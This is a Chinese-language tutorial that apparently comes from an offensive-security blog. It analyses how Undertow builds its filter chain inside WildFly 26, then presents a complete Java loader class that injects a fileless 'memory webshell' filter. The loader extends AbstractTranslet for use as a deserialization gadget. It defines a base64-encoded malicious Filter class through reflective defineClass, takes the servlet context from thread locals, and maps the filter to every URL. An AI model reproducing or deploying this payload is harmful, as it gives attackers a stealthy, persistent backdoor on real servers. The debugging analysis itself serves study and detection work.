# Wildfly内存马
### 1、环境搭建
WildFly，原名 JBoss AS (JBoss Application Server) 或者 JBoss，是一套应用程序服务器，属于开源的企业级
Java 中间件软件，用于实现基于 SOA 架构的 Web 应用和服务。 WildFly 包含一组可独立运行的软件。
本文主要分析该中间的Filter内存马，以及如何编写该中间的Filter内存马
wildfly 26.1.3
创建HelloFilter  
### 2、Filter分析
在Servlet打下断点，查看调用栈  
在调用栈中寻找第一次doFilter()出现的地方，`io.undertow.servlet.handlers.FilterHandler`中第一次调用了`doFilter`，关注fiterChain是如何生成的。  
    new FilterHandler.FilterChainImpl(exchange, filters, this.next, this.allowNonStandardWrappers);
通过该函数生成fiterChain，其中传入的关键参数是`filters`，关注`filters`  
`filters`通过`this.filters.get(dispatcher)`生成的。关注`this.filters`是如何生成的。  
`this.filters`是通过构造方法传入一个形参为filters的参数生成的，在此打个断点。看调用栈，关注哪里调用了该构造方法。  
`io.undertow.servlet.handlers.ServletPathMatches::createHandler`这里实例化了个FilterHandler。在看到这里`形参filters`的位置传入的是`noExtension`，`noExtension`来自于
`createHandler`函数的形参`List>
noExtension`，关注哪里调用了`createHandler()`  
在`io.undertow.servlet.handlers.ServletPathMatches::setupServletChains`中调用了`creatHandler`，分析`setupServletChains`  
在`setupServletChains`中的`addToListMap(noExtension,
filterMapping.getDispatcher(), filter);`，会生成ListMap。List中的元素形入
，关注`filterMapping`和`filter`是怎么生成的。  
往上跟会看到如下代码。分别分析`filterMapping` 和 `filter`是如何生成的。  
* * *
#### 1、分析`filterMapping`
先分析`filterMapping`，可以看出`filterMapping`其实是来自`deploymentInfo`，  
继续往上看的话，`deploymentInfo`是通过`this.deployment.getDeploymentInfo()`获取的。可以理解为`filterMapping`来自于`deploymentInfo`，而`deploymentInfo`来自于`deployment`。  
回过头来跟进看一下`deploymentInfo.getFilterMappings()`。`getFilterMappings`该函数从`deploymentInfo`中获取其`filterUrlMappings(ArrayList类型)`其元素类型为`FilterMapingInfo`。  
`FilterMapingInfo`如下。  
`deploymentInfo`中有`insertFilterUrlMapping`方法，用于往`filterUrlMappings`中添加`FilterMappingInfo`类型的元素。  
#### 2、分析filter
`filter`通过`filters.getManagedFilter(filterMapping.getFilterName());`获取的。  
而这里的`filters`来自于`this.deployment.getFilters()`,这里需注意一个点，`this.deployment.getFilters()`返回是一个`ManagedFilters`类型的对象。  
因此`filters.getManagedFilter(filterMapping.getFilterName())`
实际可以理解为`this.deployment.getFilters().getManagedFilter(filterMapping.getFilterName())`  
跟进`getManagedFilter`方法,`io.undertow.servlet.core.ManagedFilters::getManagedFilter`  
该方法从`managedFilterMap`中获取一个`ManagedFilter`类型的对象
而在`ManagedFilters`中还有另一个方法`addFilter`，往`managedFilterMap`中添加数据，其参数为`FilterInfo`类型的变量。  
* * *
综上所述，不管是`filter`还是`filterMapping`，都得从`deployment`出发，关注`deployment`是如何生成的
`io.undertow.servlet.handlers.ServletPathMatches`的构造方法中传入`deployment`，打下断点，重启服务器。观察调用栈  
跟到`io.undertow.servlet.core.DeploymentImpl`  
`DeploymentImpl`的构造方法中调用了`new
ServletPathMatches`，同时构造方法还是传入参数`deploymentInfo`。关注调用栈。  
这里实例化了一个`DeploymentImpl`对象，传入`deploymentInfo`,`deploymentInfo`来自于`this.originalDeployment.clone()`  
跟进`clone()`，这里通过`addFilter()`，传入`FilterInfo`类型的数据，那么可以理解为获取到`DeploymentInfo`后，可以通过addFilter()，添加`FilterInfo`数据。  
跟进`FilterInfo`，可以通过`new FilterInfo(FilterName,evilFilter)`的形式实例化一个`FilterInfo`  
### 3、编写内存马
思路
    1、获取到deployment
    2、获取到deploymentInfo
    3、实例化一个新的FilterInfo,即FilterInfo filterinfo = new FilterInfo(filternme,filter)
    4、deploymentinfo.addFilter(filterinfo)
    5、deploymentinfo.insertFilterUrlMapping(0,filterName,url, DispatcherType.REQUEST)
    6、deployment.getFilters().addFilter(filterinfo)
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import io.undertow.servlet.api.Deployment;
    import io.undertow.servlet.api.DeploymentInfo;
    import io.undertow.servlet.api.FilterInfo;
    import io.undertow.servlet.handlers.ServletRequestContext;
    import io.undertow.servlet.spec.HttpServletResponseImpl;
    import io.undertow.servlet.spec.ServletContextImpl;
    import sun.misc.BASE64Decoder;
    import javax.servlet.DispatcherType;
    import java.lang.reflect.Array;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    public class WildflyFilterLoader extends AbstractTranslet {
        private static ServletContextImpl servletContext;
        private static HttpServletResponseImpl response;
        private static DeploymentInfo deploymentInfo;
        private static Deployment deployment;
        private static String filterName = "HFilter";
        private static String filterClassName = "com.server.HFilter";
        private static String url = "/*";
        private static synchronized void LoadFilter() throws Exception {
            try{
                Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
            }catch (Exception e){
                Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                a.setAccessible(true);
                byte[] b = (new BASE64Decoder()).decodeBuffer("恶意Filter.class | base64");
                a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
            }
        }
        //获取上下文
        public static synchronized void GetWebContent() throws Exception {
            try{
                try{
                    Thread thread = Thread.currentThread();
                    Object threadLocals = GetField(thread, "threadLocals");
                    Object table = GetField(threadLocals, "table");
                    for(int i = 0; i<= Array.getLength(table)-1; i++){
                        try{
                            Object object = Array.get(table, i);
                            Object value = GetField(object, "value");
                            if (value.getClass().getName().contains("ServletRequestContext")){
                                ServletRequestContext servletRequestContext = (ServletRequestContext) value;
                                response = (HttpServletResponseImpl) GetField(servletRequestContext, "originalResponse");
                                servletContext = (ServletContextImpl) GetField(servletRequestContext, "currentServletContext");
                                deploymentInfo = (DeploymentInfo) GetField(servletContext, "deploymentInfo");
                                deployment = (Deployment) GetField(servletContext, "deployment");
                                break;
                            }
                        }catch (Exception e){}
                    }
                }catch (Exception e){
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        private static synchronized void InjectFilter() throws Exception {
            try{
                if(deployment != null && deploymentInfo != null){
                    Class characterEncodingHFilter = Thread.currentThread().getContextClassLoader().loadClass(filterClassName);
                    FilterInfo filterInfo = new FilterInfo(filterName,characterEncodingHFilter);
                    deploymentInfo.addFilter(filterInfo);
                    deploymentInfo.insertFilterUrlMapping(0,filterName,url, DispatcherType.REQUEST);
                    deployment.getFilters().addFilter(filterInfo);
                    response.addHeader("Status","Work");
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        static {
            new WildflyFilterLoader();
        }
        public WildflyFilterLoader(){
            try{
                LoadFilter();
                GetWebContent();
                InjectFilter();
            }catch (Exception e){
            }
        }
        private static synchronized Object GetField(Object o, String k) throws Exception{
            Field f;
            try {
                f = o.getClass().getDeclaredField(k);
            } catch (NoSuchFieldException e) {
                try{
                    f = o.getClass().getSuperclass().getDeclaredField(k);
                }catch (Exception e1){
                    f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
                }
            }
            f.setAccessible(true);
            return f.get(o);
        }
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }